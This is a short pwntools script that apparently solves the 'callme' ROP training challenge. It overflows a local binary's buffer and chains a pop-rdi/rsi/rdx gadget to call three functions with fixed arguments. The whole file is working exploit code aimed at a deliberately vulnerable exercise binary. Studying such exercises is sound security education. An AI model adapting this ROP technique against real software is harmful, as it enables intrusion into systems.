from pwn import *

exe = ELF("./callme", checksec=False)
p = process(exe.path)


gadget = 0x40093c # pop rdi ; pop rsi ; pop rdx ; ret
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

payload = b'A' * 40
payload += p64(gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(exe.symbols['callme_one'])

payload += p64(gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(exe.symbols['callme_two'])

payload += p64(gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(exe.symbols['callme_three'])

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)